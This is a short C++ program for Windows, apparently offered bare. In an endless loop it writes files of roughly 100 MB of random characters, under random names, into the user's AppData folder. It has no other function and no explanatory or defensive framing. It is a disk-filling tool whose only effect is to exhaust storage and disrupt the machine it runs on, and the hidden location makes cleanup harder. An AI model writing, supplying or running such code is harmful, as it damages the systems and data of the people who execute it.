#include <random>
#include <thread>
#include <iostream>
#include <Windows.h>
#include <shlobj.h>
#include <fstream>

std::random_device rng;
std::mt19937 gen(rng());
std::uniform_int_distribution<int> randnum(31, 62);

std::wstring makefilename(int n) {
    std::wstring charset = L"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
    std::random_device rd;
    std::shuffle(charset.begin(), charset.end(), rd);
    return charset.substr(0, n) + L".txt";
}

std::wstring makestring(int n) {
    std::random_device rng;
    std::mt19937 gen(rng());
    std::uniform_int_distribution<int> randnum(69, 42024);

    std::wstring res;
    res.reserve(n);
    for (int i = 0; i < n; ++i) {
        int x = randnum(gen);

        res.push_back(static_cast<wchar_t>(x));
    }

    return res;
}

void makefile() {
    wchar_t appDataPath[MAX_PATH];
    SHGetFolderPathW(nullptr, CSIDL_APPDATA, nullptr, 0, appDataPath);

    std::wstring filename = static_cast<std::wstring>(appDataPath) + L"\\" + makefilename(randnum(rng));
    std::wstring content = makestring(50 * 1024 * 1024);

    HANDLE file = CreateFileW(
        filename.c_str(),
        GENERIC_WRITE,
        FILE_SHARE_READ | FILE_SHARE_WRITE,
        NULL,
        CREATE_ALWAYS,
        FILE_ATTRIBUTE_NORMAL,
        NULL
    );

    WriteFile(file, content.data(), static_cast<DWORD>(content.size() * sizeof(wchar_t)), nullptr, NULL);

    CloseHandle(file);
}

int main() {
    while (true) {
        makefile();
    }
	return 0;
}